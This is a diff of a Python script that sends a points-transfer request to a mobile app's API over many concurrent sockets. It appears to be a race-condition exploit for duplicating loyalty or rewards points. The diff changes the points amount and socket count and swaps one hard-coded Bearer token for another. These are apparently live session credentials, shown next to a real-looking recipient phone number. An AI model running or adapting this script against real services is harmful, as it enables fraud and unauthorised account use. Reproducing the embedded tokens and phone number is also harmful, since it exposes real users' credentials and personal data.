@@ -22,7 +22,7 @@ def craft_request():
 
     data = json.dumps({
         'recipient_phone': '+380956409567',
-        'points': 1499,
+        'points': 25900//100,
         'comment': '',
     })
 
@@ -30,7 +30,7 @@ def craft_request():
     headers = {
         'user-agent': 'Android:11;version:1.12.0;Google sdk_gphone_x86',
         'accept': 'application/json',
-        'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpYXQiOjE3MzEwMTM5OTAsImV4cCI6MTczMzY0MTk5MCwicm9sZXMiOlsiUk9MRV9DTElFTlQiXSwidG9rZW5JZGVudGlmaWVyU3RyaW5nIjoiKzM4MDk2MTU3NDM2OEAxNzMxMDEzOTkwIn0.PaqfvySPedRJKEJ2xjahbMF8xU7EMaRxgzkO4Yc5u-9t5hfJ4DYjDmmSlJrScbpWCLnlSMEbhN2Grk-jQiPpyFSTDY-EiiZ4evPiOfRuZsobqt6aXhRFJ21sy0T-S1q3Y34JuuDEom0fgrZ0mdqLNN6AisWbn_2lcCKIhUkH3kAk84hiVHc8XNmdYRSKBypNzNgxeJLpLEyNgZVMCbmZw3x8k6BPVz99wOEhcamJ4FOIQ8NyyaUW2_jpv3_CNPLhxzymPtHI6XUWC-rXBa4DPAuMnFiek8IqwRTZNJujsIXjEHg9ZdBUOrEXjutYnkF_lDo__5T-q6Zvs954QGtWqfRW5g29Xj-U-E_ASXhkYvoLyRWfA-i3XHYsq5XD8JchoKrdwpPai7eaRjG7Yz0zD5R_opes7LUp4GuneObN-LUHhBDwAbCimGS-wzrw4fpbzQ6c84vfk8H2U4KNMUycRFawjMd0oweHSPQGsu9PJJS-98jidz2pRNdNq98oI_pqgtQjUiC87T598_jsE5rMkHBvtATVJCN_8h9nACAewj3Ij1c8kYH7U30OneIN0rtGfqmb3Uw5OsOe-tLYq6-x2AckHsAJC1mSp_zKA_br43GFv76MVmHe5KnTiG-A919PXdgO6gnUUXCf3X0MysOepHy7v-3A8AkK3rck-6UAa2k',
+        'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpYXQiOjE3MzExODcwODcsImV4cCI6MTczMzgxNTA4Nywicm9sZXMiOlsiUk9MRV9DTElFTlQiXSwidG9rZW5JZGVudGlmaWVyU3RyaW5nIjoiKzM4MDYzMDY4NzQ5OUAxNzMxMTg3MDg3In0.dNx7097MsLa75kcp_dTnkzWPAKvsKgx7RVXKTQSZh8dqlwQ664qiiNa3vzHLj_IkbOuP-H8GyZqZ3AHLF1bVn1GdiDMwHAY2fvM2HARJ0YiVO0TnEkNQbNuxkZaplSPW9VAz70XaLVw2HBuqqU_0DMbVaK6asMZudJLCATZAhqlbID4QysdqorcrVm2rMkoiqR-IoJtYoyAl-Pb7PfFkrMMtzETtNfQwWVO9X8sB6bh8Bi8DFbe5RsNiWywVHSdxzOqg5h_IRFfD5QxRNujZ_mXbveJ__ZNJlplBELXJMORj7MZWoCZgt_UKAIEV8ESj2s9dN4wQ3I2q_14t2jsFMby-CIDveSlMpzWBzi-c8BRO36BPR4gv_L63BLuUAuYjYVOYmqCpJpYaRtro7VAeHOaDc4vAZVmfVJkJpB9Pjc15IeHzB1ls_aYoUSFRAR89eu2DfrOT0YUoxTdCKD75tfze33WpgPKqpansj1Qw796y7JTn3ch1EPAdHOaAeBPerOY3-jk65_XdDIL9y2r1qmablGjXVnNum9Gvk444-WUlcG3F6Zr6s3czYeFEh9NF7a-RyGdn3VBa05oTn5TjHR5fj3IEoe_CEAI2jRW578qhIecFKpRFj0-BzCejTZyBvLgtYk2LJHgb-Coezj0Abb-BVe-4dLobHRMOpsyHB94',
         'content-type': 'application/json',
         'content-length': content_len,
         'host': HOST
@@ -72,7 +72,7 @@ async def main():
     # print(res)
     # sockets = [await open_socket() for i in range(1000)]
     start = time.time()
-    sockets = await asyncio.gather(*[open_socket() for _ in range(100)], return_exceptions=True)
+    sockets = await asyncio.gather(*[open_socket() for _ in range(1)], return_exceptions=True)
     # sockets = [await open_socket() for i in range(200)]
     end = time.time()
     print(end - start)
